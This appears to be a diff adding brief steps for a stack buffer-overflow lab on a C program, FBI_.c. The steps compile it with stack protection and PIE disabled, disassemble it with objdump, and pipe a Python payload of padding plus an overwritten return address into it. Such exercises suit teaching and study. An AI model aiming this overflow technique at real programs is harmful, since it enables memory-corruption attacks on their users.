@@ -1,0 +1,4 @@
+1. Compile c program : gcc FBI_.c -fno-stack-protector -m32 -no-pie
+2. Execute : ./a.out
+3. Decompose obj file : objdump -d a.out
+4. Passing payload : python -c 'print "a"*32 + "\x82\x91\x04\x08"' | ./a.out
